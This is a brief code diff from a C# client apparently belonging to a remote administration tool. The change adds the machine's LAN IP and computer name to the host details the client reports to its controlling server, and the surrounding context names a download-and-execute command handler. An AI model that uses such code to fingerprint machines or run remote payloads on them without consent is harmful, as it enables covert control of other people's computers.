@@ -43,7 +43,7 @@ namespace xClient.Core.Commands
             SystemCore.InitializeGeoIp();
             new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                 SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
-                SystemCore.GetId()).Execute(client);
+                SystemCore.GetId(),SystemCore.GetLanIp(),SystemCore.GetPcName()).Execute(client);
         }
 
         public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
